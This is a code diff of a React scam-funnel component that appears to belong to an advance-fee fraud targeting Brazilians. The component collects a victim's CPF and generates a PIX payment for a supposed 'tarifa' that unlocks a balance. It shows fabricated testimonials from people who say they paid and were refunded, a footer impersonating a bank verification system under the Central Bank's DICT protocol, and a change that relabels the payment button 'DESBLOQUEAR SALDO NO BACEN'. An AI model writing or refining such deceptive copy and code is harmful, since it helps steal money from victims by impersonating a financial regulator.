@@ -48,7 +48,7 @@ const FunnelUpsellAntiFraude = ({ balance, onGeneratePix, isGenerating, leadCpf,
         <div className="mt-3 space-y-2.5"><p className="text-gray-600 text-xs font-bold text-center">Quem já recebeu:</p><TestimonialCard avatar={testimonial1} name="Mariana S." location="São Paulo, SP" time="há 12 min" text="Eu achei que era golpe, mas paguei a tarifa e em menos de 2 minutos o PIX de R$ 3.241,00 caiu na minha conta." amount="R$ 3.241,00" /><TestimonialCard avatar={testimonial2} name="Carlos A." location="Belo Horizonte, MG" time="há 38 min" text="Fiquei com medo no início, mas vi que era protocolo do Banco Central mesmo. Paguei e recebi meu saldo inteiro." amount="R$ 2.876,50" /><TestimonialCard avatar={testimonial3} name="Fernanda L." location="Rio de Janeiro, RJ" time="há 1h" text="Quase desisti achando que ia perder dinheiro. Mas a tarifa voltou certinho e meu saldo caiu rapidinho." amount="R$ 2.654,30" /></div>
         <p className="text-gray-400 text-[10px] text-center mt-4 pb-6">© 2025 Sistema de Verificação Bancária. Protocolo DICT/BACEN.</p>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={firstName ? `${firstName.toUpperCase()}, LIBERAR MEU SALDO` : "LIBERAR MEU SALDO AGORA"} bgColor="bg-[#00A651]" shadowColor="shadow-green-200" />
+      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={firstName ? `${firstName.toUpperCase()}, DESBLOQUEAR SALDO NO BACEN` : "DESBLOQUEAR SALDO NO BACEN"} bgColor="bg-[#00A651]" shadowColor="shadow-green-200" />
     </div>
   );
 };
